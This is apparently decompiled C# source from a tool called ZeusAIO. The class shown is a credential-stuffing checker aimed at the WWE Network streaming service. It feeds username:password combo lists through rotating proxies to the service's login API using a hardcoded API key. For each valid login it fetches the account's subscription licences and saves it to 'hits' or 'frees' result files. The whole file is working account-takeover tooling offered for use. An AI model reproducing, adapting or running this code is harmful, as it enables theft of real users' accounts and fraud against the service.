// Decompiled with JetBrains decompiler
// Type: Wwe.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Wwe
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("pragma", "no-cache");
              httpRequest.AddHeader("accept", "application/json");
              httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
              httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
              httpRequest.AddHeader("origin", "https://watch.wwe.com");
              httpRequest.AddHeader("realm", "dce.wwe");
              httpRequest.AddHeader("referer", "https://watch.wwe.com/signin");
              httpRequest.AddHeader("sec-fetch-dest", "empty");
              httpRequest.AddHeader("sec-fetch-mode", "cors");
              httpRequest.AddHeader("sec-fetch-site", "cross-site");
              httpRequest.AddHeader("x-api-key", "cca51ea0-7837-40df-a055-75eb6347b2e7");
              string str1 = "{\"id\":\"" + s[0] + "\",\"secret\":\"" + s[1] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source = httpRequest.Post("https://dce-frontoffice.imggaming.com/api/v2/login", str1, "application/json").ToString();
              if (!source.Contains("\"status\":404") && !source.Contains("Unable to process JSON") && !source.Contains("JSON is syntactically invalid") && !source.Contains("failedAuthentication"))
              {
                if (source.Contains("\"authorisationToken\":"))
                {
                  string str2 = Check.Parse(source, "authorisationToken\":\"", "\",\"");
                  httpRequest.AddHeader("Authorization", "Bearer " + str2);
                  string input = httpRequest.Get("https://dce-frontoffice.imggaming.com/api/v2/user/licence?include_active=true").ToString();
                  if (input.Contains("\"licences\""))
                  {
                    try
                    {
                      string str3 = Regex.Match(input, "[<LATEST_LIC_INDEX>].licence.name\":(.*?),").Groups[1].Value;
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - WWE] " + s[0] + ":" + s[1] + " | Sub: " + str3, Color.Green);
                      Export.AsResult("/Wwe_hits", s[0] + ":" + s[1] + " | Sub: " + str3);
                      return false;
                    }
                    catch
                    {
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - WWE] " + s[0] + ":" + s[1] + " | Sub: Cap Error", Color.Yellow);
                      Export.AsResult("/Wwe_hits_cap_err", s[0] + ":" + s[1] + " | Sub: Cap Error");
                      return false;
                    }
                  }
                  else
                  {
                    ++mainmenu.frees;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[FREE - WWE] " + s[0] + ":" + s[1], Color.OrangeRed);
                    Export.AsResult("/Wwe_frees", s[0] + ":" + s[1]);
                    return false;
                  }
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
